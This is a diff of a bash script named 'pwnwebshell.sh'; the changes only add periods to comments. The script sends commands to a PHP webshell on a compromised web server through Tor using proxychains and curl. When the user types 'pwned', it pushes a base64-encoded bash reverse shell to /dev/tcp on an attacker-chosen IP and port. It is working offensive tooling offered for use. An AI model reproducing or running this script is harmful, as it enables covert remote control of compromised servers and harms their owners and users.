@@ -1,26 +1,26 @@
 #!/bin/bash
 #Tool to facilitate the management of our webshell from a terminal, passing all traffic via Tor.  (Kali/Parrot)
-#if you want to have an interactive console, use rlwrap
+#if you want to have an interactive console, use rlwrap.
 #example sudo rlwrap ./pwnwebshell.sh
 #Created by F@br1x
 #Date: lun 23 may 2022
 
-#here you must place the complete link where your php file is located in your web server committed
+#here you must place the complete link where your php file is located in your web server committed.
 url_webshell="" #change this, example: https://example.com/shell.php
 
-#reverse shell configuration
+#reverse shell configuration.
 IP="" #change this, example 192.168.0.5
 PORT="" #change this, example 443
 reverse_shell=$(echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"|base64 -w 0)
 
-#ctrl_c
+#ctrl_c.
 function ctrl_c(){
   printf "\n\n\e[1;31mProcess canceled by the user!\n\e[0m";sleep 1.5
   tput cnorm;exit 1
 }
 trap ctrl_c INT
 
-#check root
+#check root.
 id_user=$(id -u)
 if [ "$id_user" -eq 0 ]; then
   clear
@@ -29,7 +29,7 @@ else
   tput cnorm;exit 1
 fi
 
-#check if tor is active
+#check if tor is active.
 check_tor=$(sudo lsof -i:9050|grep -oP "\(.*?\)"|tr -d '()')
 if [ "$check_tor" == "LISTEN" ]; then
   tput civis
@@ -40,12 +40,12 @@ else
   tput cnorm;exit 1
 fi
 
-#run terminal
+#run terminal.
 tput cnorm;while [ "$cmd" != "exit" ]
 do
   printf "\e[1;31mpwnshell\e[1;37m:~$\e[1;32m " && read -r cmd
   proxychains -q curl -s -X GET -G $url_webshell --data-urlencode "cmd=$cmd" |awk '/<pre>/, /<\/pre>/'|sed 's/<pre>//'|sed 's/<\/pre>//'
-  #run reverse shell
+  #run reverse shell.
   if [ "$cmd" == "pwned" ]; then
     printf "\e[1;32mRun Reverse Shell :) \e[0m\n"
     proxychains -q curl -s -X GET -G $url_webshell --data-urlencode "cmd=echo $reverse_shell|base64 -d|bash"|awk '/<pre>/, /<\/pre>/'|sed 's/<pre>//'|sed 's/<\/pre>//'
